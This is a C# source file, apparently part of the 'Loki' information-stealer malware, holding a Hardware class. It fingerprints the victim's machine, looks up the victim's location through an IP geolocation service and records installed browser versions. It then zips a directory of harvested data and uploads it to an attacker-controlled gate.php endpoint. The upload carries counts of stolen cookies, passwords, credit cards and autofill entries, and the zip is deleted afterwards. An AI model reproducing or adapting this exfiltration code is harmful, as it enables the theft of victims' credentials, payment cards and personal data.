namespace loki.loki.Utilies.Hardware
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.IO;
    using System.IO.Compression;
    using System.Linq;
    using System.Management;
    using System.Net;
    using System.Text;
    using System.Windows.Forms;
    using loki.Stealer.Cookies;
    using loki.Stealer.Credit_Cards;
    using loki.Stealer.Passwords;
    using loki.Stealer.WebData;
    using loki.Utilies.CryptoGrafy;
    using Microsoft.Win32;

    public static class Hardware
    {
        public static string Define_windows()
        {
            string result;
            try
            {
                using (var managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem"))
                {
                    string text = string.Empty;
                    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
                    {
                        text = managementBaseObject["Caption"].ToString();
                    }
                    result = text.Contains("8") ? "Windows 8"
                            : text.Contains("8.1") ? "Windows 8.1"
                            : text.Contains("10") ? "Windows 10"
                            : text.Contains("XP") ? "Windows XP" 
                            : text.Contains("7") ? "Windows 7"
                            : text.Contains("Server") ? "Windows Server" 
                            : "Unknown";
                }
            }
            catch
            {
                result = "Unknown";
            }
            return result;
        }

        public static string Get_guid()
        {
            string result;
            try
            {
                using (var registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
                {
                    if (registryKey2 != null)
                    {
                        object value = registryKey2.GetValue("MachineGuid");
                        if (value != null)
                        {
                            result = value.ToString().ToUpper().Replace("-", string.Empty);
                        }
                        throw new IndexOutOfRangeException($"Index Not Found: {"MachineGuid"}");
                    }
                    throw new KeyNotFoundException($"Key Not Found: {"SOFTWARE\\Microsoft\\Cryptography"}");
                }
            }
            catch
            {
                result = "HWID not found";
            }
            return result;
        }

        public static void Info(string dir)
        {
            object potoki = 0;
            foreach (var item in new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
            {
                potoki = item["NumberOfLogicalProcessors"];
            }
            var hwid = Get_guid();
            var os = Define_windows();
            var request1 = WebRequest.Create("http://ip-api.com/line/?fields");

            string a;
            using (WebResponse response1 = request1.GetResponse())
            using (var stream = new StreamReader(response1.GetResponseStream()))
            {
                a = stream.ReadToEnd();
            }
            using (var streamWriter = new StreamWriter(Path.GetTempPath() + "\\R725K54.tmp"))
            {
                streamWriter.WriteLine(a);
            }

            string[] Mass = File.ReadAllLines(Path.GetTempPath() + "\\R725K54.tmp", Encoding.Default);

            var rfc4122bytes = Convert.FromBase64String("aguidthatIgotonthewire==");
            Array.Reverse(rfc4122bytes, 0, 4);
            Array.Reverse(rfc4122bytes, 4, 2);
            Array.Reverse(rfc4122bytes, 6, 2);
            var guid = new Guid(rfc4122bytes);

            using (var searcher8 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor"))
            {
                object cpu = 0;
                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_NetworkAdapterConfiguration"))
                {
                    object mac = 0;
                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        mac = queryObj["MACAddress"];
                    }
                    foreach (ManagementObject queryObj in searcher8.Get())
                    {
                        cpu = queryObj["Name"];
                    }
                    object gpu = 0;
                    using (var searcher11 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
                    {
                        foreach (ManagementObject queryObj in searcher11.Get())
                        {
                            gpu = queryObj["Caption"];
                        }
                    }
                    using (var ozu = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory"))
                    {
                        int ram = 1;
                        foreach (ManagementObject queryObj in ozu.Get())
                        {
                            ram++;
                        }
                        int sum = 0;
                        using (var streamWriter = new StreamWriter(dir + "\\information.log"))
                        {
                            streamWriter.WriteLine($"{crypt.AESDecript(Settings.name)} {crypt.AESDecript(Settings.Stealer_version)} {crypt.AESDecript(Settings.coded)}");
                            streamWriter.WriteLine(" ");
                            streamWriter.WriteLine("IP : " + Mass[13]);
                            streamWriter.WriteLine("Country Code : " + Mass[2]);
                            streamWriter.WriteLine("Country :" + Mass[1]);
                            streamWriter.WriteLine("State Name : " + Mass[4]);
                            streamWriter.WriteLine("City :" + Mass[5]);
                            streamWriter.WriteLine("Timezone :" + Mass[9]);
                            streamWriter.WriteLine("ZIP : " + Mass[6]);
                            streamWriter.WriteLine("ISP : " + Mass[10]);
                            streamWriter.WriteLine("Coordinates :" + Mass[7] + " , " + Mass[8]);
                            streamWriter.WriteLine(" ");
                            streamWriter.WriteLine("Username : " + Environment.UserName);
                            streamWriter.WriteLine("PCName : " + Environment.MachineName);
                            streamWriter.WriteLine("UUID : " + guid);
                            streamWriter.WriteLine("HWID : " + hwid);
                            streamWriter.WriteLine("OS : " + os);
                            streamWriter.WriteLine("CPU : " + cpu);
                            streamWriter.WriteLine("CPU Threads: " + potoki);
                            streamWriter.WriteLine("GPU : " + gpu);
                            streamWriter.WriteLine("RAM :" + ram + " GB");
                            streamWriter.WriteLine("MAC :" + mac);
                            streamWriter.WriteLine("Screen Resolution :" + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height.ToString());
                            streamWriter.WriteLine("System Language : " + System.Globalization.CultureInfo.CurrentUICulture.DisplayName);
                            streamWriter.WriteLine("Layout Language : " + InputLanguage.CurrentInputLanguage.LayoutName);
                            streamWriter.WriteLine("PC Time : " + DateTime.Now);
                            streamWriter.WriteLine("Browser Versions");

                            if (File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe"))
                            {
                                object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
                                if (value2 != null)
                                {
                                    sum++;
                                    streamWriter.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
                                }
                                else
                                {
                                    sum++;
                                    value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
                                    streamWriter.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
                                }

                            }
                            if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
                            {
                                object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                                if (value != null)
                                {
                                    sum++;
                                    streamWriter.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion);
                                }
                                else
                                {
                                    sum++;
                                    value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                                    streamWriter.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion);
                                }
                            }
                            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data"))
                            {
                                string text2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null).ToString();
                                text2 = text2.Remove(text2.Length - 6, 6);
                                text2 = text2.Remove(0, 1);
                                string empty = FileVersionInfo.GetVersionInfo(text2).FileVersion;
                                string text3 = string.Empty;
                                string empty2 = string.Empty;
                                if (empty.Split('.').First().Equals("54"))
                                {
                                    text3 = "67.0.3396.87";
                                }
                                if (empty.Split('.').First().Equals("55"))
                                {
                                    text3 = "68.0.3440.106";
                                }
                                if (empty.Split('.').First().Equals("56"))
                                {
                                    text3 = "69.0.3497.100";
                                }
                                if (empty.Split('.').First().Equals("57"))
                                {
                                    text3 = "70.0.3538.102";
                                }
                                sum++;
                                streamWriter.WriteLine("Opera Version: " + text3);
                            }
                            if (sum == 0)
                            {
                                streamWriter.WriteLine("Popular Browsers Not Found!");
                            }
                            streamWriter.Close();
                        }
                    }
                }
            }

            ZipFile.CreateFromDirectory(dir, $"{Path.GetTempPath()}\\{Mass[1]}_{Mass[13]}_{hwid}.zip");
            try
            {
                new WebClient().UploadFile($"{Settings.Url}{$"gate.php?id={1}&os={os}&cookie={GetCookies.CCookies}&pswd={GetPasswords.Cpassword}&version={crypt.AESDecript(Settings.Stealer_version)}&cc={Get_Credit_Cards.CCCouunt}&autofill={Get_Browser_Autofill.AutofillCount}&hwid={hwid}"}", "POST", Path.GetTempPath() + "\\" + Mass[1] + "_" + Mass[13] + "_" + hwid + ".zip");

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            File.Delete($"{Path.GetTempPath()}\\{Mass[1]}_{Mass[13]}_{hwid}.zip");
        }
    }
}